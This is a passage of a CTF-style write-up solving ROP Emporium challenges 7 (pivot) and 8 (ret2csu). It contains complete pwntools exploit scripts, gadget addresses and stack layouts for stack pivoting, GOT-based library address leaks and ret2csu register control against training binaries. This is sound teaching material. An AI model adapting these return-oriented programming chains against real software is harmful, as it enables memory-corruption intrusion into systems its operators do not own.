	return returnPayload



xlatb_gaget	    = p64(0x0400628)
# 0400610: mov eax, 0; pop rbp; ret;
null_eax_gaget	    = p64(0x0400610)
def write_al(location):
	returnPayload  = null_eax_gaget
	returnPayload += new_bp
	returnPayload += pop_rbx(location)
	returnPayload += xlatb_gaget

	return returnPayload

elf = ELF(target)
def find_byte(c):
	return next(elf.search(c))


pop_rdi_gaget = p64(0x04006a3)
def pop_rdi(val):
	returnPayload = pop_rdi_gaget
	returnPayload += p64(val)
	return returnPayload


# stosb byte ptr [rdi], al; ret;
stosb_gaget = p64(0x0400639)


rdi_set = False

def write_byte(dest, c):
	byte_loc = find_byte(c)
	
	# place the value in byte_loc into al
	returnPayload  = write_al(byte_loc)
	global rdi_set
	if not rdi_set:
		returnPayload += pop_rdi(dest)
		rdi_set = True
	returnPayload += stosb_gaget
	return returnPayload



def write_string(destination, string):
	dest = destination
	returnPayload = b""
	global rdi_set 
	rdi_set= False
	for i in range(len(string)):
		returnPayload += write_byte(dest, string[i])
		dest += 1
	
	return returnPayload

"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
import binascii
def print_payload(payload):
	for i in range(0, len(payload), 8):
		continue
            # print(binascii.hexlify(payload[i:i+8]))

io = process(target)

#Fill up the buffer and the base pointer
payload = junk + new_bp

payload += write_string(write_loc, b"flag.txt")

# This is the vaddr of system
# First return to the location of the pop rdi
payload += pop_rdi(write_loc)
payload += print_file

payload += back_junk


# print("The payload is:")
# print(payload)
print("Payload size is:" + str(len(payload)))
print("Pop RBX takes up: " + str(pop_rbx_size))
input("Hit enter to apptempt exploit")
print(io.clean(0.5).decode("utf-8"))
io.send(payload)

input("exploit sent hit enter to end")

print(io.clean(0.5).decode("utf-8"))
sleep(1)

f = open('./payload', 'wb')
f.write(payload)
f.close()

```
## Challenge 7

Continuing to work our way through common problems with creating ROP exploits, what happens if you run out of space (like I did last challenge) and you can't shrink your payload anymore? Well, if you can write data into other locations on the stack then you can just write your payload there and call it from your smaller area. Which is exactly what this challenge is about.

> There's only enough space for a small ROP chain on the stack, but you've been given space to stash a much larger chain elsewhere. Learn how to pivot the stack onto a new location.


However, there's another challenge that we face in this binary. Rather then having a print_file function we have a ret2win function. Which is nice, but it is placed in an linked library and not normally called, so there is no static address to call it by. 

However first things first, lets get access to the larger exploit chain.

Looking at the usefulGadgets section we see the following.

```
pwndbg> disass usefulGadgets 
Dump of assembler code for function usefulGadgets:
   0x00000000004009bb <+0>:     pop    rax
   0x00000000004009bc <+1>:     ret    
   0x00000000004009bd <+2>:     xchg   rsp,rax
   0x00000000004009bf <+4>:     ret    
   0x00000000004009c0 <+5>:     mov    rax,QWORD PTR [rax]
   0x00000000004009c3 <+8>:     ret    
   0x00000000004009c4 <+9>:     add    rax,rbp
   0x00000000004009c7 <+12>:    ret    
   0x00000000004009c8 <+13>:    nop    DWORD PTR [rax+rax*1+0x0]
```

Also running piviot gives the following
```
./pivot
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7fb54f72cf10
Send a ROP chain now and it will land there
> 
Thank you!

Now please send your stack smash
> 
Thank you!

Exiting
```

A quick google of the `xchg` instruction shows that it is exchange. Basically it just swaps the values. Combine that with the pop rax gadget we have, and we can make the stack pointer whatever value we want. If you look through the output of the pivot binary, it actually prints off the location on the heap that we store our second chain in too. This means we just have to make the stack pointer that value.

An important note, that value changes every time the binary is run, so you can not just hard code it. You have to parse the binaries outputs to craft your payload.



```
         | stack          |
         | -------------- |
32 bytes | start buffer   |
8  bytes | base pointer   | 
8  bytes | pop rax gadget |
8  bytes | rax value      | # This must be calculated from the binaries print out
8  bytes | xchg gadget    | 
8  bytes | -------------- |

```

This will start executing our chain stored in the heap which we now have to craft.

So the idea is pretty simple, we just have to call the ret2win function. Trying to figure out where the ret2win function is shows that it is in the attached library.

```
pwndbg> disass ret2win
No symbol table is loaded.  Use the "file" command.
pwndbg> ls
core  exploit.py  flag.txt  libpivot.so  notes  payload  pivot  pivot.zip
pwndbg> file ./libpivot.so 
Reading symbols from ./libpivot.so...
(No debugging symbols found in ./libpivot.so)
Error in re-setting breakpoint 1: Function "main" not defined.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
pwndbg> disass ret2win
Dump of assembler code for function ret2win:
   0x0000000000000a81 <+0>:     push   rbp
   0x0000000000000a82 <+1>:     mov    rbp,rsp
   0x0000000000000a85 <+4>:     sub    rsp,0x40

```

So we have to figure out some way to get into the added library. To do this let's look at the functions that the pivot binary uses.

```
rabin2 -i ./pivot
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004006d0 GLOBAL FUNC       free
2   0x004006e0 GLOBAL FUNC       puts
3   0x004006f0 GLOBAL FUNC       printf
4   0x00400700 GLOBAL FUNC       memset
5   0x00400710 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00000000 WEAK   NOTYPE     __gmon_start__
8   0x00400720 GLOBAL FUNC       foothold_function
9   0x00400730 GLOBAL FUNC       malloc
10  0x00400740 GLOBAL FUNC       setvbuf
11  0x00400750 GLOBAL FUNC       exit
```

In there we see the binary uses the foothold function and according to the challenge description "This challenge imports a function named foothold_function() from a library that also contains a ret2win() function." To do this, we have to understand how the plt (Procedure Linkage Table) works and external libraries are added to a binary. 

To understand how the plt binary works, I would recommend reading [this](https://ropemporium.com/guide.html#Appendix%20A) section on ROP Emporium. 

So what we need to do is call the foothold function which is in the external library, but has a plt entry, in order to populate the value in the global offset table to get an address in the linked library. We then figure out what that value is and then add/subtract the offset to the ret2win function and go to that location. 

If we look at the gadgets that we have access to, we have complete control over rax, can add values to rax (if we can control rbp), and we can place arbitrary chunks of memory into rax.

After doing a quick check, we are able to easily find a pop rbp register as well. 
So we collect the information that we need:

```
gdb ./libpivot.so
pwndbg> disass foothold_function 
Dump of assembler code for function foothold_function:
   0x000000000000096a <+0>:     push   rbp
   0x000000000000096b <+1>:     mov    rbp,rsp
   0x000000000000096e <+4>:     lea    rdi,[rip+0x1ab]        # 0xb20
   0x0000000000000975 <+11>:    call   0x830 <puts@plt>
   0x000000000000097a <+16>:    nop
   0x000000000000097b <+17>:    pop    rbp
   0x000000000000097c <+18>:    ret    
End of assembler dump.
pwndbg> disass ret2win 
Dump of assembler code for function ret2win:
   0x0000000000000a81 <+0>:     push   rbp
   0x0000000000000a82 <+1>:     mov    rbp,rsp
   0x0000000000000a85 <+4>:     sub    rsp,0x40

```

0x96a-0xa81 = offset

Global offset Table address
```
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 9
 
...
[0x601040] foothold_function -> 0x400726 (foothold_function@plt+6) ◂— push   5
...

pwndbg> plt
...
0x400720: foothold_function@plt
...
```

Finally, let's see if there is anything that can move the IP to rax.

```
pwndbg> ropper -- --search "jmp rax"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp rax

[INFO] File: /root/working/pivot/pivot_64/pivot
0x00000000004007c1: jmp rax; 
```


And that gadget works perfectly. So we can construct our payload as follows:

```
         | stack          |
         | -------------- |
8  bytes | foothold_func  | # call foothold function so it is populated
8  bytes | pop_rax gadget |                                                     
8  bytes | foothold got   | # The memory location of the footholds GOT entry                       
8  bytes | mov rax [rax]  | # Place the value at rax into rax               
8  bytes | pop rbp        | #                                                     
8  bytes | offset         | # offset between foothold and ret2win func        
8  bytes | add rax, rbp   | # Add the offset to rax                   
8  bytes | jmp rax        | # Call the jmp rax gadget to call ret2win                       
8  bytes | -------------- |

```

You would then place this payload into the heap and call it with the previously crafted attack which gives us the overall exploit of:

```Python
#!/usr/bin/python3

from pwn import *

write_loc 	= 0x601029
print_file 	= p64(0x400620)
target		= "./pivot"
back_junk 	= b"B" * 20

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2

"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
import binascii
def print_payload(payload):
	for i in range(0, len(payload), 8):
		continue
		print(binascii.hexlify(payload[i:i+8]))

io = process(target)
first_out = io.clean(0.5).decode("utf-8")
print(first_out)
stack_smash = junk + new_bp

############### Set up the pivot ##############

# pop rax
stack_smash += p64(0x04009bb)

# the RAX binary
# I need to be interacting with the binary here by parsing out the heap loc
pivot_loc = int(first_out.split("\n")[4].split()[-1], 16)
stack_smash += p64(pivot_loc)

# exchange rsp and rax
stack_smash += p64(0x04009bd)

stack_smash += back_junk

################ create the payload ####################
#Fill up the buffer and the base pointer

# call the foothold function
payload = p64(0x00400720)

# pop rax off with the value of the location of the got for the foothold func
payload += p64(0x04009bb)
payload += p64(0x601040)

# mov the value in the got into rax
payload += p64(0x4009c0)

# place the offset from foothold to ret2win in rbp
## pop rbp
payload += p64(0x004007c8)
## offset to place in it
payload += p64(0xa81-0x96a)

# add the offset to rax
payload += p64(0x04009c4)

# jump to rax
payload += p64(0x04007c1)

# print("The payload is:")
# print(payload)
print("Payload size is:" + str(len(payload)))
input("Hit enter to apptempt exploit")

print(io.clean(0.5).decode("utf-8"))
io.send(payload)
print(io.clean(0.5).decode("utf-8"))
io.send(stack_smash)
io.send(payload)
input("exploit sent hit enter to end")

print(io.clean(0.5).decode("utf-8"))
sleep(1)

f = open('./payload', 'wb')
f.write(payload)
f.close()

```
## Challenge 8

And we've reached the end of the road with these challenges and have just one more to do. The task is pretty simple, like before there is a ret2win function in the attached library and we have to call it with specific arguments, `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)` to be exact. 

So we remember the registers for arguments go rdi, rsi, and rdx for 1st, 2nd, and 3rd arguments to a function respectively. 

Opening up the binary, we can see that the ret2win function is in the plt, so we don't have to worry about getting offsets to it or anything.

```
pwndbg> plt
0x400500: pwnme@plt
0x400510: ret2win@plt
```

We also see that we can easily control rsi and rdi.

```
pwndbg> ropper -- --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /root/working/ret2csu/ret2csu_64/ret2csu
0x00000000004006a3: pop rdi; ret; 

pwndbg> ropper -- --search "pop rsi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi

[INFO] File: /root/working/ret2csu/ret2csu_64/ret2csu
0x00000000004006a1: pop rsi; pop r15; ret; 
```

However, we can not find any gadgets that affect rdx in the binary. I spent a lot of time here trying to figure this out and got no where, so I ended up reading the paper linked in the challenge: [BlackHat Asia paper](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf) and [this article](https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html) by voidsecurity. 

The idea is that automatid tools like ropper don't find every possible gadget and if you know what you are doing you can find gadgets in the boiler plate code that gcc adds to every binary. If you can find useful gadgets in the boilerplate, those gadgets should be in every binary and hence universal.

The boilerplate code we are using for this challenge is the \_\_libc_csu_init function. Which is as follows:

```
   0x0000000000400640 <+0>:     push   r15
   0x0000000000400642 <+2>:     push   r14
   0x0000000000400644 <+4>:     mov    r15,rdx
   0x0000000000400647 <+7>:     push   r13
   0x0000000000400649 <+9>:     push   r12
   0x000000000040064b <+11>:    lea    r12,[rip+0x20079e]        # 0x600df0
   0x0000000000400652 <+18>:    push   rbp
   0x0000000000400653 <+19>:    lea    rbp,[rip+0x20079e]        # 0x600df8
   0x000000000040065a <+26>:    push   rbx
   0x000000000040065b <+27>:    mov    r13d,edi
   0x000000000040065e <+30>:    mov    r14,rsi
   0x0000000000400661 <+33>:    sub    rbp,r12
   0x0000000000400664 <+36>:    sub    rsp,0x8
   0x0000000000400668 <+40>:    sar    rbp,0x3
   0x000000000040066c <+44>:    call   0x4004d0 <_init>
   0x0000000000400671 <+49>:    test   rbp,rbp
   0x0000000000400674 <+52>:    je     0x400696 <__libc_csu_init+86>
   0x0000000000400676 <+54>:    xor    ebx,ebx
   0x0000000000400678 <+56>:    nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000400680 <+64>:    mov    rdx,r15
   0x0000000000400683 <+67>:    mov    rsi,r14
   0x0000000000400686 <+70>:    mov    edi,r13d
   0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x000000000040068d <+77>:    add    rbx,0x1
   0x0000000000400691 <+81>:    cmp    rbp,rbx
   0x0000000000400694 <+84>:    jne    0x400680 <__libc_csu_init+64>
   0x0000000000400696 <+86>:    add    rsp,0x8
   0x000000000040069a <+90>:    pop    rbx
   0x000000000040069b <+91>:    pop    rbp
   0x000000000040069c <+92>:    pop    r12
   0x000000000040069e <+94>:    pop    r13
   0x00000000004006a0 <+96>:    pop    r14
   0x00000000004006a2 <+98>:    pop    r15
   0x00000000004006a4 <+100>:   ret   
```


We see in this function that line 64 sets the rdx redgister to r15 and on line 98 we can control r15 with the pop instruction right before the ret. The problem is that on line 73, there is a relitive call to the function pointed to by \[r12+rbx\*8\]. Now we control r12 (see line 92) and rbp, however that call is double de refrenced. So the execution will continue to happen at \[r12+rbx\*8\] -> address -> start_of_call. So we have to find a do nothing function, which has a function pointer pointing to it somewhere in memory. 

So let's start up the program and break in gdb right before our exploit starts and see if we can find any function pointers to use. In the second article I referenced, I noticed this line, "In \_DYNAMIC variable ie. .dynamic section of executable we can find pointers to \_init and \_fini section." So let's print off the values in dynamic right now.


```
pwndbg> x/30gx &_DYNAMIC 
...
0x600e30:       0x000000000000000c      0x00000000004004d0
0x600e40:       0x000000000000000d      0x00000000004006b4
0x600e50:       0x0000000000000019      0x0000000000600df0
...
```

A couple of those values look familarish. The 400 values are the range of the plt (which we can call, so pointers to functions) and the 600 is around the got (which are pointers to functions). So now we just got to figure out which functions these are.

looking at 0x4004d0 we see
```
pwndbg> tele 0x4006b4 20
00:0000│  0x4006b4 (_fini) ◂— sub    rsp, 8
01:0008│  0x4006bc (_fini+8) ◂— ret    
```
which is basically a do nothing functions which we can call. So if we look at the rest of the function all we have to do is get past the jne on line 84 which is easy enough because we have control over all the registers used in the compare.

   0x0000000000400691 <+81>:    cmp    rbp,rbx
   0x0000000000400694 <+84>:    jne    0x400680 <\_\_libc_csu_init+64>

So now we have everything we need to make the payload.

Note, I'll be using gadgets from the csu init function with just gadget $line_num for notation

```
         | stack          |
         | -------------- | 
32 bytes | start buffer   |
8  bytes | base pointer   | # fill the buffer and base pointer
8  bytes | gadget 90      | # pop everything off rbx, rbp, r12-15      
8  bytes | 0x1            | # rbx value                                         
8  bytes | 0x2            | # rbp value must be 1 more then rbx for the cmp and jump               
8  bytes | addr in dynm   | # r12 the address in dynamic pointing to func pointer to csu_fini
8  bytes | 0xdeadbeef...  | # r13 mapped to edi                                   
8  bytes | 0xcafebabe...  | # r14 mapped to rsi                               
8  bytes | 0xd00df00d     | # r15 mapped to rdx                       
8  bytes | gadget 64      | # the gadget for placing rdx and going through the call
8  bytes | random junk    | # stack pointer is add/sub to 
8  bytes | 0x1            | # we have to redo all the pops to finish out the function
8  bytes | 0x2            |                
8  bytes | addr in dynm   | 
8  bytes | 0xdeadbeef...  |                                   
8  bytes | 0xcafebabe...  |                                
8  bytes | 0xd00df00d     |                       
8  bytes | pop rdi        | # replace the changed rdi value
8  bytes | 0xdeadbeef...  | 
8  bytes | ret2win        | # all values have been placed so we can call ret2win
8  bytes | -------------- |

```


```Python
#!/usr/bin/python3

from pwn import *


write_loc 	= 0x601029
print_file 	= p64(0x400620)
target		= "./ret2csu"
back_junk 	= b"B" * 20
# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2


"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
import binascii
def print_payload(payload):
	for i in range(0, len(payload), 8):
		continue
		print(binascii.hexlify(payload[i:i+8]))

io = process(target)
first_out = io.clean(0.5).decode("utf-8")
print(first_out)
payload = junk + new_bp
payload += p64(0x0040069a)		# pop everything
payload += p64(0x1)			# rbx val *8 for call
payload += p64(0x2)			# rbp must be 1 more then rbx
payload += p64(0x600e48-8)		# Base of the call, do nothing ptr in dynamic
payload += p64(0xdeadbeefdeadbeef)	# edi through r13
payload += p64(0xcafebabecafebabe)	# rsi through r14
payload += p64(0xd00df00dd00df00d)	# rdx through r15
payload += p64(0x0400680)		# ret call to ptr call


payload += p64(0x0123456789abcdef)	# random junk skipped over
# we have to go through all of the pops again from gaget 1

payload += p64(0x1)			# rbx val *8 for call
payload += p64(0x2)			# rbp must be 1 more then rbx
payload += p64(0x600e48-8)		# Base of the call, do nothing ptr in dynamic
payload += p64(0xdeadbeefdeadbeef)	# edi through r13
payload += p64(0xcafebabecafebabe)	# rsi through r14
payload += p64(0xd00df00dd00df00d)	# rdx through r15


payload += p64(0x04006a3)		# pop edi address
payload += p64(0xdeadbeefdeadbeef)	# edi value

payload += p64(0x400510)		# the ret2win addr

# print("The payload is:")
# print(payload)
print("Payload size is:" + str(len(payload)))

input("Hit enter to apptempt exploit")



print(io.clean(0.5).decode("utf-8"))

input("exploit sent hit enter to end")
io.send(payload)


print(io.clean(0.5).decode("utf-8"))


sleep(1)


f = open('./payload', 'wb')
f.write(payload)
f.close()

```